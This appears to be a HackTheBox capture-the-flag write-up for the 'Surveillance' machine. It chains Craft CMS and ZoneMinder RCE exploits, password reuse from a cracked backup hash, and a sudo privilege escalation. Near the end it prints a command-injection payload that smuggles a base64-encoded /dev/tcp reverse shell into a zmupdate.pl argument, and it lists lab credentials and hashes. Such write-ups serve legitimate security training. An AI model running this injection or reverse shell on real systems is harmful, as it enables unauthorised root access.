---
layout: default_1
title: "Surveillance - HTB"
date: 2024-04-20
tags: writeup hackthebox surveillance
---

# HTB Surveillance Write Up
![HTB Surveillance](/assets/2024-04-20-writeups-surveillance-htb/machine_info.png "HTB Surveillance")


## Introduction
Surveillance provider company with focus com home security.

## Network Scan

<details>
<summary><b>Nmap scan result</b></summary>
<div markdown="1">
~~~
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS

~~~
</div>
</details>

## Investigation
The http server redirects to a vhost `surveillance.htb`.  

The main website is static, and it was created with `Craft CMS`
![Main Website](/assets/2024-04-20-writeups-surveillance-htb/main_website.png "Main Website")
![Craft CMS](/assets/2024-04-20-writeups-surveillance-htb/craft_cms.png "Craft CMS")

The CMS version in hyperlinked in the website `https://github.com/craftcms/cms/tree/4.4.14`.  
This version is vulnerable to a RCE vulnerability with a public exploit - [CVE-2023-41892][cve-2023-41892]

Running the exploit return a shell with `www-data` user
```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Manually enumerating the server, the following information was obtained
- Mariadb runnning on port 3306
- Two users with shell: matthew and zoneminder
- CraftCMS database credentials on .env file
   - user: craftuser
   - pass: CraftCMSPassword2023!
- Backup folder with a database dump
   - /var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip

The current CMS database only had one user with a high iteration on the hash. This make it hard to crack, executed hashcat anyways.
`admin@surveillance.htb | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe`

Meanwhile, searching the backup for more information. The backup stored the admin pass with a weak hash.
`admin@surveillance.htb | 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec`
Easily cracked to `starcraft122490`

Checking for password reuse and logged as matthew.
```
$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
```

No sudoers entry for this user. Moving on to run linpeas on the system.
Linpeas found another credential, this time for Zoneminder database on /usr/share/zoneminder/www/api/app/Config/database.php
- user: zmuser
- pass: ZoneMinderPassword2023

Search for more password hashes in the database and found another uncracked hash
`admin | $2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd.`

Moving on to zoneminder service. The service description is
`A full-featured, open source, state-of-the-art video surveillance software system.`
Again, vulnerable to Unauthenticated RCE [CVE-2023-26035][cve-2023-26035].

Moved to the other user on the box, zoneminder
```
$ id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
```

Verifying sudores:
```
$ sudo -l
...
(ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

/user/bin/zm\*.pl is a suite of tools for the zoneminder service.
One way to exploit this suite is by abusing the zmupdate.pl tool, as shown in [this blog][zm-privesc].
Reverse shell example:
```
$ sudo /usr/bin/zmupdate.pl --version 1 --user='$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC81NTU1IDA+JjEK | base64 -d | bash)'
```

```
# whoami
root
```


[cve-2023-41892]: <https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226> "cve-2023-41892"
[cve-2023-26035]: <https://github.com/rvizx/CVE-2023-26035> "cve-2023-26035"
[zm-privesc]: <https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/> "ZoneMinder PrivEsc"
